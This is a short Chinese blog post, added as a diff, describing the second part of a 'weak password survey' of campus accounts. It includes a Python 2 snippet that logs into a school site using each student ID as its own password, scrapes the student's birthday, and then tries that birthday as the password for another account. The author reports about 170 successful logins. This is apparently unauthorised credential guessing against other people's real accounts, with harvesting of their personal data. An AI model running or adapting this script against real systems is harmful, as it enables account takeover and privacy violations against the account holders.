@@ -1,0 +1,32 @@
+---
+date: 2012-04-07 01:33:28+00:00
+layout: post
+title: 校园账户弱口令调查（二）
+categories: [Python]
+description: "上回说到我将获取生日信息，并将其作为登陆密码来进行测试。资料在学校某个网站上，post登陆后即可看到个人信息。"
+---
+
+上回说到我将获取生日信息，并将其作为登陆密码来进行测试。资料在学校某个网站上，post登陆后即可看到个人信息。
+
+获取信息需要解析html。在Python里面，有个很好用的模块用于解析html/xml，叫BeautifulSoup。我用它找出所有的标签，并且用正则表达式进行匹配，找出生日。  
+因为并不是每个学号都有个人信息，所以有时候会引发异常，并导致程序中断，所以需要使用try/except来进行异常的处理。获取生日后，分别使用8位格式和6位格式进行登录，如果登录成功，记录下来。
+
+    
+    try:
+        password = user
+        data_login(user,password)
+        resp2 = urllib2.urlopen(info_url+user)
+        soup = BeautifulSoup(resp2.read())
+        data = soup.findAll('td')
+        for i in data:
+            if re.search(r'[0-9]{8}',i.text):
+                 if len(i.text) == 8:
+                      waiwang_login(user, str(i.text))
+                      waiwang_login(user, i.text[2:])
+        k = k+1
+    except:
+        print str(k)+' error'
+        k = k+1
+
+
+经过测试，记录下来的大约有170个账号是使用生日作为密码的。这样看来，大家的安全意识还有待加强。
